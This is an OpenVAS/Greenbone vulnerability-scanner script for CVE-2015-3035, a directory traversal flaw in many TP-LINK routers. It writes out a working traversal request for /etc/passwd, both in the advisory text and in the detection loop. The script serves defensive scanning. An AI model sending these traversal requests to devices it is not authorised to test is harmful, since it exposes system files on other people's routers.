if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105250" );
	script_cve_id( "CVE-2015-3035" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Multiple TP-LINK Products Local File Include Vulnerabilit" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-04-10 16:25:11 +0200 (Fri, 10 Apr 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "Router_Webserver/banner" );
	script_xref( name: "URL", value: "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150410-0_TP-Link_Unauthenticated_local_file_disclosure_vulnerability_v10.txt" );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the computer. Other attacks are also
  possible." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "The following HTTP request shows how directory traversal can be used to gain
  access to files without prior authentication:

  ===============================================================================

  GET /login/../../../etc/passwd HTTP/1.1

  Host: <host>" );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "The remote TP-LINK Device is prone to a local file include vulnerability" );
	script_tag( name: "affected", value: "TP-LINK Archer C5 (Hardware version 1.2)

  TP-LINK Archer C7 (Hardware version 2.0)

  TP-LINK Archer C8 (Hardware version 1.0)

  TP-LINK Archer C9 (Hardware version 1.0)

  TP-LINK TL-WDR3500 (Hardware version 1.0)

  TP-LINK TL-WDR3600 (Hardware version 1.0)

  TP-LINK TL-WDR4300 (Hardware version 1.0)

  TP-LINK TL-WR740N (Hardware version 5.0)

  TP-LINK TL-WR741ND (Hardware version 5.0)

  TP-LINK TL-WR841N (Hardware version 9.0)

  TP-LINK TL-WR841N (Hardware version 10.0)

  TP-LINK TL-WR841ND (Hardware version 9.0)

  TP-LINK TL-WR841ND (Hardware version 10.0)" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || ( !ContainsString( banner, "Server: Router Webserver" ) && !ContainsString( banner, "realm=\"TP-LINK" ) && !ContainsString( banner, "realm=\"TL-" ) )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/login/../../../../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

